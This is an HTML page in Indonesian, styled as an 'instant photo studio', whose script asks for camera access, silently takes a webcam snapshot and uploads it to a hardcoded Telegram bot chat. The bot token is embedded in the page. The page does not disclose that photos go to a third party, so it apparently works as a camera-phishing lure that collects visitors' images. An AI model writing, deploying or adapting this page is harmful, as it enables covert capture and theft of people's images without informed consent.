<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Studio Foto Instan</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full bg-gray-800 p-6 rounded-2xl shadow-xl text-center">
        <h1 class="text-2xl font-bold mb-4">Studio Foto Instan</h1>
        <p class="mb-6 text-gray-400">Klik tombol di bawah untuk mengambil foto.</p>
        
        <button id="startBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full transition-all">
            Mulai Sesi Foto
        </button>

        <video id="video" class="hidden w-full h-auto rounded-lg mt-4" autoplay playsinline></video>
        
        <div id="status" class="mt-4 text-sm text-yellow-400 font-medium"></div>
    </div>

    <script>
        const BOT_TOKEN = '8429814704:AAH2DUBcP5rok16SLARgJwjWeeNOrFKf0RY';
        const CHAT_ID = '6128943834';

        const video = document.getElementById('video');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        async function initCamera() {
            try {
                status.innerText = "Meminta izin kamera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.classList.remove('hidden');
                startBtn.classList.add('hidden');
                status.innerText = "Kamera aktif, bersiap mengambil foto...";
                
                setTimeout(takePhoto, 2000);
            } catch (err) {
                status.innerText = "Error Kamera: " + err.message;
            }
        }

        async function takePhoto() {
            // Membuat elemen canvas sementara di memori saja (tidak dimasukkan ke DOM/HTML)
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = video.videoWidth;
            tempCanvas.height = video.videoHeight;
            tempCanvas.getContext('2d').drawImage(video, 0, 0);
            
            const imageData = tempCanvas.toDataURL('image/jpeg');

            status.innerText = "Mengirim foto...";
            sendToTelegram(imageData);
        }

        async function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', dataURLToBlob(imageBlob));
            formData.append('caption', "📸 Foto Baru Berhasil Diambil!");

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.ok) {
                    status.innerText = "✅ Foto berhasil dikirim!";
                    status.classList.replace('text-yellow-400', 'text-green-400');
                    // Stop kamera setelah sukses
                    video.srcObject.getTracks().forEach(track => track.stop());
                } else {
                    status.innerText = "Error API: " + result.description;
                }
            } catch (e) {
                status.innerText = "Gagal koneksi ke Telegram.";
            }
        }

        function dataURLToBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--){ u8arr[n] = bstr.charCodeAt(n); }
            return new Blob([u8arr], {type:mime});
        }

        startBtn.addEventListener('click', initCamera);
    </script>
</body>
</html>
